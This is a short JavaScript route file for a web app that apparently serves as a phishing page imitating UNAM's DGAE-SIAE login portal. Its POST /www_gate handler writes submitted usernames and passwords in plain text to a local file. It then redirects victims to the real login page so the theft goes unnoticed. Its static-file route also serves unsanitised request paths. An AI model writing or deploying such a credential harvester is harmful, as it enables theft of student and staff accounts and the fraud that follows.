exports.install = function() {

  ROUTE('/public/*', staticFiles);

  // Rutas normales
  ROUTE('/', 'index');
  ROUTE('/views/dashboard', function() {
      this.layout('');
      this.view('dashboard');
  });

  ROUTE('POST /www_gate', save_credentials);
};

function staticFiles() {
  this.file(this.req.url.substring(1)); 
}

async function save_credentials() {
  let self = this;
  let body = self.req.body;
  let { usr_logi, usr_pass } = body;
  const fs = require('fs');
  const fd = fs.openSync("input.txt", "r+");
  let position = 0;
  try {
      fs.writeSync(fd, `${usr_logi} ${usr_pass}`, 0, 'utf8');
  } catch (e) {
      console.error(e);
  }
  self.redirect('https://www.dgae-siae.unam.mx/www_gate.php');
}
